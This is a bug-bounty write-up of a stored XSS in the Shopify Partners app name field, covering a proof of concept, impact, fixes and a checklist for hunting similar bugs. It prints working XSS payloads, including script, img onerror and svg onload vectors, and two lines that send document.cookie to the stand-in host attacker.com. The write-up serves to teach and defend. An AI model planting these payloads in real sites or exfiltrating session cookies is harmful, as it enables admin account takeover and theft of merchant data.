Stored XSS via App Name Field on Shopify Partners — HackerOne #125027

How registering a Shopify Partner app with a crafted name like <script>alert(1)</script> caused that payload to execute in the browser of every Shopify admin who viewed the app listing — a classic stored (persistent) XSS with session-hijacking potential.

What Is Stored XSS?

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts into a web page that are then executed in the browser of other users. There are three main types:

  • Reflected XSS — the payload is embedded in a URL and executed immediately when the victim clicks it. It is not persisted on the server.
  • Stored (Persistent) XSS — the payload is saved to the server (database, file, log) and re-served to every user who views the affected page. This is the type in this report.
  • DOM-based XSS — the payload is injected and executed entirely in the browser via insecure client-side JavaScript, without the server ever seeing the payload.

Stored XSS is the most impactful of the three because a single submission can affect every subsequent visitor — including high-privilege users like administrators.

Stored XSS in an admin context is often rated High or Critical, because the attacker can steal admin session cookies, perform privileged actions on behalf of admins, or pivot to further compromise the platform.

The Target — Shopify Partner Dashboard

Shopify Partners is the developer and agency program through which third parties build apps for the Shopify App Store. A partner can register a new app, giving it a name, description, URLs, and other metadata. This metadata is then displayed inside the Shopify admin interface for merchants who install the app, and inside Shopify's internal tools for employees who review app submissions.

Because the app name appears in contexts reviewed by Shopify admins, unsanitised input there is a high-value stored XSS surface: the attacker (the malicious partner) never has admin access themselves, but their payload runs in the browser of every admin who views the listing.

The Bug

The app name field on the Shopify Partner dashboard accepted arbitrary HTML and JavaScript without sanitisation or encoding. When a partner submitted a new app with a name containing a script tag, Shopify stored the raw string in its database and reflected it unescaped into the HTML of the app listing page.

The injected app name and its rendered output 
# Partner submits a new app with a crafted name:
App Name:  <script>alert(document.cookie)</script>

# Shopify stores this string and later renders it in the listing page:
<div class="app-name">
  <script>alert(document.cookie)</script>   ← raw, unescaped
</div>

# What it SHOULD look like (properly HTML-encoded):
<div class="app-name">
  &lt;script&gt;alert(document.cookie)&lt;/script&gt;  ← safe, rendered as text
</div>

The app name was reflected without HTML-encoding in at least two locations:

  • The app listing inside the Shopify admin interface — visible to any Shopify merchant who had the app installed.
  • The Partner dashboard itself — visible to Shopify employees during app review and to the partner who created the app.
No user interaction beyond the initial setup is required. Once the malicious app is submitted and stored, the script runs automatically every time any affected page loads — no further action from the attacker is needed. This is what makes stored XSS fundamentally more dangerous than reflected XSS.

Proof of Concept

Steps to reproduce (as documented in the report):

  • 1. Create a Shopify Partners account (free, requires a business email).
  • 2. Navigate to Apps → Create app in the Partner dashboard.
  • 3. In the App name field, enter a script payload:
Proof-of-concept payload 
# Basic alert PoC (demonstrates execution):
<script>alert(1)</script>

# Cookie-stealing payload (demonstrates session hijack risk):
<script>
  fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

# img-based fallback (if script tags are filtered but img onerror is not):
<img src=x onerror="alert(document.cookie)">
  • 4. Save the app. The name is persisted to Shopify's database.
  • 5. Open the app listing — either from the Partner dashboard or from an admin account that has the app installed.
  • 6. The script executes immediately in the browser. An alert dialog pops up showing the current session cookies.
No special privileges needed to plant the payload. A Partner account is free to create. Any person with a browser and an email address can register as a Shopify Partner and submit an app. The attacker never needs access to a merchant or admin account — they just create the trap and wait for an admin to walk into it.

Impact

  • Session cookie theft — if the session cookie is not marked HttpOnly, the attacker's payload can exfiltrate it to a remote server. With the cookie, the attacker can fully impersonate the admin without knowing their password.
  • Admin account takeover — even with HttpOnly cookies, an attacker can use XSS to perform any action the victim admin could: change settings, exfiltrate data, create new admin users, etc.
  • Merchant data exposure — Shopify admins have access to store orders, customer PII, payment information, and business analytics. An XSS payload running in their browser can silently harvest all of this.
  • Persistent, no user interaction required — once planted, the payload fires on every page load for every affected user. Unlike phishing, there is no "don't click the link" defence.
  • Supply-chain trust abuse — the malicious app passes through Shopify's app review process. If reviewers load the listing as part of their review workflow, the payload also fires in their browser.
  • Scale — a high-install app could expose hundreds of thousands of Shopify merchants, each having their admin session silently compromised on every visit.

The Fix

The root cause is output encoding failure: user-supplied strings are inserted directly into an HTML context without being encoded. The fix is straightforward:

Output encoding — the correct pattern 
# Vulnerable — raw string interpolated into HTML template:
<div class="app-name">{{ app.name }}</div>
# If app.name = '<script>...</script>', the script executes.

# Secure — HTML-encode all dynamic output before insertion:
<div class="app-name">{{ app.name | html_escape }}</div>
# Renders: &lt;script&gt;...&lt;/script&gt; — shown as text, not executed.

# Additionally — validate and restrict the app name at input time:
def validate_app_name(name):
    if len(name) > 100:
        raise ValidationError("App name too long")
    if re.search(r'[<>"\'`]', name):
        raise ValidationError("App name contains disallowed characters")
    return name.strip()
  • HTML-encode all output — every string from user input or the database must be HTML-escaped before insertion into an HTML context. Characters <, >, &, ", and ' must be replaced with their HTML entities.
  • Apply a Content Security Policy (CSP) — a strict CSP (script-src 'self') prevents inline scripts from executing even if encoding is missed, providing a second line of defence.
  • Set HttpOnly and Secure on session cookies — this doesn't prevent XSS execution, but it prevents the most direct consequence (cookie theft via document.cookie).
  • Input validation at write time — reject or strip HTML-special characters in fields that should never contain markup (e.g. app names, organisation names, usernames).

How to Hunt Stored XSS in Developer/Partner Portals

  • Every text input that is displayed to other users is a target. App names, descriptions, organisation names, profile bios, product titles, support ticket subjects — anything a user types and another user reads is a potential stored XSS sink.
  • Pay special attention to inputs shown in privileged contexts. If your input is displayed to an admin, a reviewer, or a support agent, the impact is dramatically higher. Prioritise these surfaces.
  • Test all rendering contexts. The same value might be safe in one context (e.g. a React component that auto-escapes) and unsafe in another (e.g. an internal admin tool built quickly without the same framework). Submit once, check everywhere the value appears.
  • Use a canary string first. Before throwing raw script tags at a field, start with a benign unique string like xss-probe-1234<"'>. View source on the output page. If the characters appear unencoded, you have a confirmed injection point — then escalate to a full payload.
  • Check rich-text fields carefully. Markdown editors, WYSIWYG editors, and HTML-accepting fields are high-risk surfaces. Even if the frontend strips tags on display, the raw value stored in the database may be served differently in other contexts (e.g. API responses, PDF exports, email notifications).
  • Test SVG uploads. SVG files are XML-based and can contain inline <script> tags. If a platform allows SVG uploads and serves them inline (not as a download), each upload is a potential stored XSS vector.
Stored XSS hunting checklist 
# Step 1 — Find all user inputs that appear in other users' views
Inputs to check:  profile name, bio, app name, org name, ticket title,
                   product description, file name, comment body, ...

# Step 2 — Submit a canary to detect lack of encoding
xss-<"'>-canary
# View source: are the characters <, ", ', > encoded as &lt; &quot; etc?
# If NOT — injection point confirmed.

# Step 3 — Escalate to a PoC payload
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Step 4 — Check every view where the value renders:
#   - Your own dashboard
#   - Other users' views (switch accounts)
#   - Admin / reviewer UI (if accessible)
#   - Email notifications (HTML emails)
#   - API responses (may be used by other frontends)

# Step 5 — Confirm impact: does document.cookie return session tokens?
fetch('https://attacker.com/?' + btoa(document.cookie))
Why partner/developer portals are high-value XSS targets: they are often built by smaller teams with less security scrutiny than the main product, they grant access to admin-level review workflows, and the attacker's entry point (creating an account) is intentionally open to the public. A single field on a partner registration form can give an attacker a persistent foothold in an admin's browser.
